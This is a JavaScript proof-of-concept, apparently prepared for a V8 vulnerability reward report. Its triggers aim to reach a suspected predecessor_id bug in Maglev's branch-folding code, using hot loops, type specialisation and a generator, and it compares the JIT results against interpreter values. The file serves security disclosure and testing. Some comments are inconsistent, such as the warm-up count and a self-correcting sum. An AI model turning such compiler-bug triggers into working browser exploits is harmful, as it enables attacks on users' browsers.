/**
 * Reachability proof for FoldBranch() predecessor_id bug.
 * src/maglev/maglev-graph-optimizer.cc lines 394-404
 *
 * How to run:
 *   out/x64.release/d8 --jitless  poc_vuln06_trigger.js > baseline.txt
 *   out/x64.release/d8 --maglev   poc_vuln06_trigger.js > maglev.txt
 *   diff baseline.txt maglev.txt
 *   # Any difference = predecessor_id corruption confirmed
 *
 * ASAN build (strongest signal):
 *   out/x64.asan/d8 --maglev poc_vuln06_trigger.js
 *   # Expected: use-of-uninitialized-value report from line 404
 *
 * What this tests:
 *   We create a loop where Maglev can fold an inner branch (always-taken).
 *   The folded branch's target block has a Phi merging two paths.
 *   If predecessor_id is wrong, the Phi picks the wrong incoming value →
 *   the result differs from the interpreter output.
 */

"use strict";

// -- trigger 1: folded constant branch inside hot loop
// Maglev sees (x | 0) === x as always-true for integer x,
// folds the branch, calls FoldBranch() on the merge block.
// That merge block has a Phi for 'val'. Wrong predecessor_id
// means Phi picks -999 (dead arm) instead of i*2 (live arm).
function foldedBranchPhi(n) {
  let sum = 0;
  for (let i = 0; i < n; i++) {
    const x = i | 0;           // force Int32
    const alwaysInt = (x | 0) === x;   // constant-fold candidate

    let val;
    if (alwaysInt) {
      val = x * 2;             // live path
    } else {
      val = -999;              // dead path — if Phi picks this: wrong output
    }
    sum += val;
  }
  return sum;
}

// -- trigger 2: type-specialised branch with loop Phi
// Maglev specialises on Int32 feedback. Once specialised,
// the is-heap-number branch becomes dead → FoldBranch.
// Merge block Phi has inputs (from-entry=0, from-loop=acc+x).
// Wrong predecessor_id would pick 0 every iteration instead.
function specialisedBranchPhi(arr) {
  let acc = 0;
  for (let i = 0; i < arr.length; i++) {
    const x = arr[i];
    // Maglev folds this after Int32 specialisation:
    if (typeof x === "number") {
      acc += x;
    }
    // no else: the false-branch is dead once Maglev knows x is always number
  }
  return acc;
}

// -- trigger 3: generator + folded branch (matches VULN-06 description most directly)
// Generator resume creates a merge point (Phi for 'x').
// The folded constant branch inside the generator hits FoldBranch.
function* genTrigger(n) {
  let x = 0;
  for (let i = 0; i < n; i++) {
    if (true) {        // always-taken → FoldBranch candidate
      x += i;
    }
    if (i % 10 === 0) yield x;
  }
  return x;
}

// -- warm up so Maglev compiles (need ~1000+ calls for tier-up)
const INT_ARR = Array.from({ length: 100 }, (_, i) => i + 1);
for (let w = 0; w < 200; w++) {
  foldedBranchPhi(50);
  specialisedBranchPhi(INT_ARR);
}

// -- reference values (run both jitless and maglev and compare)
const N = 500;

// trigger 1
const t1 = foldedBranchPhi(N);
// sum of i*2 for i=0..N-1 = N*(N-1)
const t1_expected = N * (N - 1);
if (t1 !== t1_expected) {
  print("MISMATCH t1: got=" + t1 + " expected=" + t1_expected);
} else {
  print("ok t1=" + t1);
}

// trigger 2
const t2 = specialisedBranchPhi(INT_ARR);
const t2_expected = INT_ARR.reduce((a, b) => a + b, 0);
if (t2 !== t2_expected) {
  print("MISMATCH t2: got=" + t2 + " expected=" + t2_expected);
} else {
  print("ok t2=" + t2);
}

// trigger 3: run gen a few times after warm-up
let g_final = 0;
for (let r = 0; r < 20; r++) {
  const g = genTrigger(50);
  let last;
  for (const y of g) { last = y; }
  g_final = last;
}
// last yielded value from genTrigger(50) = sum at i=40 = 40*41/2 = 820... actually sum of i for i in range [0..49] at yield i%10==40 is sum(0..40) = 820
// We just check it's stable across calls
print("gen result=" + g_final);

// -- print useful info for the VRP report
print("---");
print("If any MISMATCH line appeared above: JIT output differs from interpreter.");
print("If no mismatch: run with --jitless and compare manually (diff the two outputs).");
print("Strongest proof: run with ASAN build and look for uninitialized-value report.");
